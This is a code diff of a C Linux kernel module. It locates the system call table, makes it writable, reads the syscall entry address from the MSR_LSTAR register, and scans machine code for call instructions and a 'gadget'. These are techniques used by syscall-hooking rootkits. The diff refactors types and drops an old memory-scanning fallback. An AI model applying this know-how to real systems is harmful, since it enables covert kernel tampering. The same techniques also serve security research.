@@ -3,23 +3,7 @@
 
 unsigned long *sys_call_table_retrieve(void)
 {
-  #if LINUX_VERSION_CODE > KERNEL_VERSION(4, 4, 0)
-  /* looking for the system call table address in exported symbols */
   return (unsigned long *)kallsyms_lookup_name("sys_call_table");
-
-#else
-	unsigned long int i;
-	unsigned long *syscall_table;
-	
-	for (i = (unsigned long int)sys_close; i < ULONG_MAX;
-			i += sizeof(void *)) {
-		syscall_table = (unsigned long *)i;
-
-		if (syscall_table[__NR_close] == (unsigned long)sys_close)
-			return syscall_table;
-	}
-	return NULL;
-#endif
 }
 
 /* make SCT writeable */
@@ -43,24 +27,23 @@ int set_sct_ro(unsigned long *table_ptr)
 }
 
 /* get the system call handler from MSR */
-u8 *get_64_sys_call_handler(void)
+unsigned long get_64_sys_call_handler(void)
 {
-  u64 __sys_handler_entry;
+  unsigned long __sys_handler_entry;
   rdmsrl(MSR_LSTAR, __sys_handler_entry);
-  return (u8 *) __sys_handler_entry;
+  return __sys_handler_entry;
 }
 
 /* CALL rel32 - relative displacement */
 unsigned long get_syscall_64_addr(void)
 {
   int i;
-  unsigned long off;
-  void *addr = (void *) get_64_sys_call_handler(); // get the system call handler
+  unsigned long addr = get_64_sys_call_handler(); // get the system call handler
   unsigned char *op = (unsigned char *)addr;
   for (i = 0; i < 512; i++) {
 	if (is_call(op)) {
-	  off = get_call_off(op);
-	  return (unsigned long)off;
+	  addr = get_call_off(op);
+	  return addr;
 	}
 	op++;
   }
@@ -68,12 +51,12 @@ unsigned long get_syscall_64_addr(void)
 }
 
 /* sbb %rdx,%rdx is the next instruction after %rax check */
-unsigned long get_gadget_addr(void *call_sys_addr)
+unsigned long get_gadget_addr(unsigned long call_sys_addr)
 {
   int i;
   unsigned char *op = (unsigned char*)call_sys_addr;
   for (i = 0; i < 512; i++) {
-	if (is_sbb_in(op))
+	if (is_and_in(op))
 	  return (unsigned long)op;
 	op++;
   }
